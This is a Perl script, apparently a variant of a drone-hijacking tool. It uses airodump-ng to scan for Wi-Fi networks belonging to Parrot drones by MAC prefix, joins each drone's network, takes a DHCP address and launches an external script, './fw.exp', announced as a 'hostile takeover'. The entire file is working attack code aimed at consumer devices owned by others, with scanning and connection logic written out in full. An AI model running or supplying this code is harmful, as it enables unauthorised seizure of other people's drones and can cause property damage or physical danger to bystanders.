#!/usr/bin/perl

# mac addresses of ANY type of drone we want to attack
# Parrot owns the 90:03:B7 block of MACs and a few others
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E EA:44:B1/;
use strict;

my $interface  = shift || "wlan4";

# paths to applications
my $dhclient	= "dhclient";
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";
my $nodejs	= "nodejs";

# put device into monitor mode
sudo($ifconfig, $interface, "down");
#sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "/tmp/dronestrike";
my %skyjacked;

# print "KILLING NETWORK SERVICES\n";
sudo("rm", "/var/lib/dhcp/dhclient.leases");
#print "\n\n";

while (1)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			print "SCANNING FOR DRONES\n";
			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			#print "pid $pid\n";

			# wait 5 seconds then kill
			sleep 10; #sometimes maybe need 10-20
			#print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);
			#kill(9, $pid);
			close(DUMP);
		};

		sleep 4;
		# read in APs
		my %clients;
		my %chans;
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{
				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{
					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@drone_macs)
					{
						# print "CHECKING $dev \n";;
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
						{
							print "CHANNEL $1 $2 $3\n";
							# $1: the drone MAC;$2: drone channel;$3: drone wifi essid
							print "drone MAC is $1\n";
							print "drone channel is $2\n";
							print "drone wifi nameis $3\n";	
							$chans{$1} = [$2, $3];				

						}

						# grab our drone MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/)
						{
							print "CLIENT $1 $2\n";
							$clients{$1} = $2;
						}
					}
				}
				close(APS);
				sudo("rm", $tmpfile1);
				#unlink($tmpfile1);
		}
		print "\n\n";

		sleep(2);
		# go into managed mode
		#sudo($airmon, "stop", $interface);

		# connect to each drone and run our zombie client!
		foreach my $drone (keys %chans)
		{
			next if $skyjacked{$chans{$drone}[1]}++;

			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
			sudo("ifconfig", $interface, "down");
			sudo($iwconfig, $interface, "mode", "Managed");
			sudo($iwconfig, $interface, "essid", $chans{$drone}[1]);
			print "\nchans means $chans{$drone}[1]\n";
			sudo("ifconfig", $interface, "up");

			print "Acquiring IP from drone for hostile takeover\n";
			sudo($dhclient, "-v", $interface);

			print "\n\nTAKING OVER DRONE\n";
			my $ar_ip = `ifconfig | grep -A 1 '$interface' | tail -1 | cut -d ':' -f 2 | cut -d ' ' -f 1`;
			print "IP: $ar_ip\n";
			my $cmd = "./fw.exp " . $ar_ip;
			system($cmd);
			exit();
		}

	sleep 5;
}
	
sub sudo
{
	#print "Running: @_\n";
	system("sudo", @_,);
}


